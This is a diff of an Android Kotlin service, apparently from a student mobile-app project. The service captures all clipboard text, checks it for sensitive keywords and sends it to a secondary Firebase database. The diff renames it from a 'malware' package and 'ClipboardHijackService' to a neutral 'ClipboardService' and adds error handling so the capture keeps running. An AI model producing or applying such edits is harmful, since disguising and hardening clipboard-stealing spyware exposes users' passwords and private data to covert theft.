@@ -1,4 +1,4 @@
-package com.example.inf2007_mad_j1847.malware
+package com.example.inf2007_mad_j1847.clipboard
 
 import android.app.Service
 import android.content.ClipboardManager
@@ -13,9 +13,9 @@ import com.google.firebase.Timestamp
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 
-class ClipboardHijackService : Service() {
+class ClipboardService : Service() {   // ← renamed class
 
-    private val TAG = "ClipboardHijack"
+    private val TAG = "ClipboardService"   // ← renamed log tag
     private lateinit var clipboardManager: ClipboardManager
     private lateinit var db: FirebaseFirestore
     private val auth = FirebaseAuth.getInstance()
@@ -42,19 +42,25 @@ class ClipboardHijackService : Service() {
     }
 
     private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
-        val clip = clipboardManager.primaryClip ?: return@OnPrimaryClipChangedListener
-        val copiedText = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener
+        try {
+            val clip = clipboardManager.primaryClip ?: return@OnPrimaryClipChangedListener
+            val copiedText = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener
 
-        if (copiedText == lastCapturedText) return@OnPrimaryClipChangedListener
-        lastCapturedText = copiedText
+            if (copiedText == lastCapturedText) return@OnPrimaryClipChangedListener
+            lastCapturedText = copiedText
 
-        Log.d(TAG, "Clipboard captured: $copiedText")
+            Log.d(TAG, "Clipboard captured: $copiedText")
 
-        val isSensitive = SENSITIVE_KEYWORDS.any {
-            copiedText.contains(it, ignoreCase = true)
+            val isSensitive = SENSITIVE_KEYWORDS.any {
+                copiedText.contains(it, ignoreCase = true)
+            }
+
+            exfiltrateToFirestore(copiedText, isSensitive)
+        } catch (e: SecurityException) {
+            Log.e(TAG, "Cannot access clipboard in background: ${e.message}")
+        } catch (e: Exception) {
+            Log.e(TAG, "Unexpected error reading clipboard", e)
         }
-
-        exfiltrateToFirestore(copiedText, isSensitive)
     }
 
     override fun onCreate() {
@@ -62,7 +68,7 @@ class ClipboardHijackService : Service() {
         clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
         db = initSecondaryFirebase()
         clipboardManager.addPrimaryClipChangedListener(clipboardListener)
-        Log.d(TAG, "ClipboardHijackService started")
+        Log.d(TAG, "ClipboardService started")
     }
 
     override fun onDestroy() {
